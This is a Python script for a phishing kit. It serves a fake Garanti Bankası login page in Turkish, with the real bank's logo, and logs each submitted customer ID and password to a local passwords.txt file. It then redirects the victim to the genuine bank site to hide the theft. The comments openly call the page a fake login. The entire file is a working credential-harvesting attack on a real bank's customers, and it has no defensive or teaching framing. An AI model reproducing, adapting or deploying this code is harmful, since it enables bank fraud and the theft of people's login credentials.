import threading
import subprocess

def start_flask_server():
    from flask import Flask, request, redirect

    app = Flask(__name__)

    # Sahte giriş sayfası HTML içeriği
    fake_login_html = """
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Garanti Bankası Giriş Yap</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background-color: #fafafa;
                margin: 0;
                padding: 0;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
            }
            .container {
                background-color: #fff;
                padding: 30px;
                border-radius: 8px;
                box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                width: 300px;
                text-align: center;
            }
            .logo {
                width: 100px;
                margin-bottom: 20px;
            }
            h2 {
                margin-bottom: 20px;
                color: #262626;
            }
            input[type="text"],
            input[type="password"] {
                width: calc(100% - 20px);
                padding: 10px;
                margin-bottom: 10px;
                border: 1px solid #dbdbdb;
                border-radius: 5px;
                box-sizing: border-box;
            }
            input[type="submit"] {
                width: calc(100% - 20px);
                padding: 10px;
                background-color: #0095f6;
                border: none;
                color: #fff;
                font-weight: bold;
                border-radius: 5px;
                cursor: pointer;
                transition: background-color 0.3s ease;
            }
            input[type="submit"]:hover {
                background-color: #0077b6;
            }
            .error-message {
                color: red;
                margin-top: 10px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <img class="logo" src="https://www.garantibbva.com.tr/apple-touch-icon-57x57.png" alt="Garanti Bankası Logo">
            <h2>Garanti Bankası'na Giriş Yap</h2>
            <form action="/login" method="post">
                <input type="text" name="username" placeholder="Tc Kimlik Numarası veya Müşteri Numarası">
                <input type="password" name="password" placeholder="Şifre">
                <input type="submit" value="Giriş Yap">
            </form>
            <p class="error-message">Lütfen Şifrenizi Giriniz.</p>
        </div>
    </body>
    </html>
    """

    @app.route('/')
    def index():
        return fake_login_html

    @app.route('/login', methods=['POST'])
    def login():
        username = request.form['username']
        password = request.form['password']
        # Şifreyi passwords.txt dosyasına kaydet
        with open("passwords.txt", "a") as file:
            file.write("Kullanıcı adı: {}\n".format(username))
            file.write("Şifre: {}\n".format(password))
        return redirect("https://www.garantibbva.com.tr/")

    app.run(port=8080)

def start_php_server():
    subprocess.run(['php', '-S', 'localhost:8080'])

if __name__ == '__main__':
    flask_thread = threading.Thread(target=start_flask_server)
    php_thread = threading.Thread(target=start_php_server)

    flask_thread.start()
    php_thread.start()

    flask_thread.join()
    php_thread.join()
